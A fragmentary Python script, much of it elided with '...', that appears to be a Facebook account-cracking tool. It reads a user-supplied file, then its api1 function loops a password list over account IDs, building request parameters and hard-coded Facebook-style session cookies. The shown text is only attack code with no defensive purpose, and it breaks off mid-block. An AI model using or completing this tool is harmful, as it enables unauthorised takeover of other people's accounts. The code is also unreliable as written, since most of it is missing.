        ...
        try:
                ...
                if x == ("***"):
                        ...
                        if xd in ['1','01']:
                                ...
                                print(' PUT FILE EXAMPLE :  /sdcard/File.koussai.etc..')
                                linex()
...
def api1(ids,names,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        jazoest = li2+j1
                        cookies = {
    'datr': 'lOhIZWOvVQiqnEH84PlTVcpZ',
    'sb': 'RN5TZSAf0hhDTfHft8rpoCU0',
    'm_pixel_ratio': '3',
    'wd': '360x646',
    'fr': '0Mfu3BPPLm4SWjvTF..BlU95E.sq.AAA.0.0.BlU95P.AWUxJWP7Rsc',
                                }
                        headers = {
